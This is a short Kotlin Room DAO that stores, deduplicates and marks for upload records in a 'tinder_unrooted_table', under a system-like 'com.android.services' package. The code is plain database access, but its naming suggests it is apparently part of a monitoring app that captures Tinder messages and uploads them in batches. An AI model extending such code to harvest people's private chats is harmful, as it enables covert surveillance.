package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.TinderUnrooted
import com.android.services.util.AppConstants

@Dao
interface TinderUnrootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(imoUnrooted: TinderUnrooted)

    @Query("Select uniqueId from tinder_unrooted_table where uniqueId = :messageId")
    fun checkTinderAlreadyExists(messageId: String): String?

    @Query("Select * from tinder_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllTinderUnrootedLogs(status: Int): List<TinderUnrooted>

    @Query("Update tinder_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int
}